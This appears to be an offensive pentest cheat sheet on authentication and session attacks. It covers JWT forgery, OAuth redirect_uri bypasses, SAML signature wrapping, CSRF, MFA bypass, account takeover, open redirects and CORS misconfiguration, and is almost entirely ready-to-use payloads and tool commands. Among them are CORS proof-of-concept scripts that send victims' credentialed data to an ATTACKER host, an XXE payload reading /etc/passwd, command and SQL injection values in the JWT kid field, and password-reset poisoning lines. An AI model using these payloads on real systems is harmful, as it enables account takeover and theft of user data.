# Auth & Session Reference: JWT, OAuth, SAML, CSRF, MFA, Account Takeover

---

## JWT Attacks

### Detection / Decode
```bash
# Decode without verify
echo "eyJ..." | base64 -d
# Tool
jwt_tool TOKEN
```

### None algorithm
```json
// Change alg to "none", remove signature
{"alg":"none","typ":"JWT"}
// Variations: "None", "NONE", "nOnE"
```

### RS256 → HS256 confusion
```bash
# Get the server's public key (from /jwks.json, /.well-known/jwks.json, or x509 cert)
# Sign with HMAC using the public key as the HMAC secret
jwt_tool TOKEN -X k -pk server.pem
```

### Key injection (JWK header parameter)
```json
// Add "jwk" param to header containing your own public key
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_N",
    "e": "AQAB"
  }
}
```

### jku JWKS URL injection
```json
// Point jku to your JWKS server
{
  "alg": "RS256",
  "jku": "https://ATTACKER/jwks.json"
}
```

### kid parameter injection
```json
// SQL injection via kid
{"kid": "' UNION SELECT 'your_secret'-- -"}

// Path traversal (use /dev/null as secret)
{"kid": "../../../../dev/null"}

// Command injection
{"kid": "| id"}
```

### Tools
```bash
jwt_tool TOKEN -T               # Tamper
jwt_tool TOKEN -X a             # None alg
jwt_tool TOKEN -X s             # HS256 with secret
jwt_tool TOKEN -X k -pk pub.pem # RS256→HS256
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # Crack
```

---

## OAuth Misconfigurations

### redirect_uri manipulation
```
# Whitelisted: https://app.com/callback
# Try:
https://attacker.com
https://app.com.attacker.com
https://app.com@attacker.com
https://app.com/callback@attacker.com
https://app.com/callback/../../../attacker.com
https://app.com/callback?redirect=https://attacker.com
# Open redirect on app.com
https://app.com/oauth?redirect_uri=https://app.com/redirect?url=https://attacker.com
```

### Token theft via Referer header
```
// If the access_token is in the URL fragment and the page loads external resources,
// it leaks via Referer: Authorization: Bearer TOKEN
// Find open redirect or XSS after callback to exfil token
```

### state parameter CSRF
```
// Missing or predictable state = OAuth CSRF
// Attacker initiates OAuth flow, captures authorization URL, 
// tricks victim into completing it → links attacker's external account to victim's
```

### Token leakage scenarios
```
# In URL fragment: https://app.com/callback#access_token=...
# Via JavaScript history.pushState accessible to XSS
# Logged in referrer header
```

---

## SAML Injection

### Signature stripping
```xml
<!-- Remove the Signature element from SAML assertion -->
<!-- Some parsers accept unsigned assertions if signature is simply absent -->
```

### XML Signature Wrapping (XSW) attacks
```xml
<!-- XSW1: Move signed Response into Extension, clone Response -->
<!-- XSW2: Unsigned Response wraps signed Response -->
<!-- XSW3: Clone Assertion, move signed Assertion into Extension -->
<!-- XSW4: Clone Assertion, place signed copy inside unsigned wrapper -->
<!-- XSW5: Mutated copy before signed assertion -->
<!-- XSW6: Mutated copy after signed assertion -->
<!-- XSW7: Extensions wrapping -->
<!-- XSW8: Object element wrapping -->
```

### XML comment injection
```xml
<!-- CVE-2017-11427 (ruby-saml), CVE-2017-11428 (OneLogin), CVE-2017-11429 (Clever), CVE-2017-11430 (SAML2) -->
<NameID>admin<!--</NameID><NameID>attacker--></NameID>
<!-- Parser A sees: admin, Parser B sees: attacker -->
```

### XXE in SAML
```xml
<!-- SAML is XML → standard XXE applies -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<SAMLResponse>...<Attribute>&xxe;</Attribute></SAMLResponse>
```

---

## CSRF

### GET-based
```html
<img src="https://target.com/transfer?to=attacker&amount=1000">
<a href="https://target.com/delete?id=123">click me</a>
```

### POST-based (auto-submitting form)
```html
<form method="POST" action="https://target.com/transfer" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('f').submit()</script>
```

### JSON CSRF
```html
<!-- Content-type: text/plain still works for simple requests -->
<form method="POST" action="https://target.com/api/update" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","junk":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

### CSRF bypass techniques
```
# Missing or weak CSRF token
# Predictable CSRF token (UUID v1, timestamp-based)
# Token not tied to session (swap tokens between sessions)
# Referrer-based protection: 
Referer: https://target.com.ATTACKER.com
Referer: null (from <iframe sandbox>, data: URL)
# SameSite=Lax: only GET requests, not POST
```

### CSRF via CORS (null origin)
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api', {method:'POST',credentials:'include',body:'evil'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>
"></iframe>
```

---

## MFA Bypass

| Technique | Method |
|-----------|--------|
| Response manipulation | Change `"success":false` → `"success":true` |
| Status code manipulation | Change 4xx → 200 OK |
| Code in response | Check response body for OTP leak |
| Code reuse | Try same OTP twice |
| No brute-force protection | Brute 6-digit OTP (1M combinations) |
| Missing integrity check | Use OTP from any account |
| CSRF on disable 2FA | CSRF to turn off MFA |
| Force browsing | Skip /2fa/verify → go to /dashboard directly |
| Null/000000 | Try `null`, `000000` as OTP |
| Array bypass | `{"otp":["1111","2222","VALID_OTP","4444"]}` |
| Backup code abuse | Brute backup codes |
| Session not expired | Old sessions still valid after 2FA enabled |

---

## Account Takeover

### Password reset poisoning
```
# Host header injection → reset link sent to ATTACKER
POST /forgot-password
Host: ATTACKER.com

# X-Forwarded-Host injection
X-Forwarded-Host: ATTACKER.com

# Dangling markup in email (steal token via CSS/image)
<img src="https://ATTACKER/track?token=
```

### Username collision
```
# Unicode normalization: pɑypal.com → paypal.com
# Case: ADMIN@example.com == admin@example.com  
# Whitespace: "admin " == "admin"
# Punycode: аdmin@example.com (Cyrillic а) → admin@example.com
```

### IDOR via user ID
```
# Change user_id in profile/settings request
GET /api/users/1234/profile → change to 1235
```

### Subdomain takeover → cookie theft
```
# Find subdomain pointing to expired service
# Take over subdomain → steal cookies from parent domain
Host: expired.victim.com → CNAME → orphan endpoint
```

---

## Open Redirect

### Common parameters
```
url=, redirect=, next=, returnTo=, return_url=, goto=, dest=, destination=, 
target=, rurl=, to=, view=, dir=, location=, checkout_url=, continue=, 
return_path=, ref=, referrer=, forward=, out=, from=
```

### Bypass techniques
```
# URL encoded
/redirect?url=https%3A%2F%2Fattacker.com
# Double encoded
/redirect?url=https%253A%252F%252Fattacker.com
# Protocol manipulation
/redirect?url=//attacker.com
/redirect?url=javascript:alert(1)
# @-sign bypass
/redirect?url=https://target.com@attacker.com
/redirect?url=https://attacker.com@target.com  # Rare bypass
# Backslash
/redirect?url=https:\\attacker.com
# Unicode (U+FF0F ／)
/redirect?url=https:／／attacker.com
# Whitespace
/redirect?url=%0A//attacker.com
# Fragment trick
/redirect?url=https://evil.com#target.com
```

---

## CORS Misconfiguration

### Origin reflection
```javascript
// Test: send Origin: https://ATTACKER.com
// Vulnerable if Access-Control-Allow-Origin: https://ATTACKER.com
// + Access-Control-Allow-Credentials: true
```

### Null origin
```javascript
// Some apps whitelist "null" origin
// Trigger via data: URL or sandboxed iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://target.com/api', {credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://ATTACKER/?d='+JSON.stringify(d)))
</script>">
```

### Regex bypass
```javascript
// Target whitelists /^https:\/\/target\.com/
// Bypass: https://target.com.ATTACKER.com
// Target whitelists /target\.com$/
// Bypass: https://evil-target.com
```

### Exploit PoC
```html
<script>
fetch('https://target.com/api/userdata', {credentials:'include'})
.then(r => r.json())
.then(data => fetch('https://ATTACKER/?data='+encodeURIComponent(JSON.stringify(data))))
</script>
```
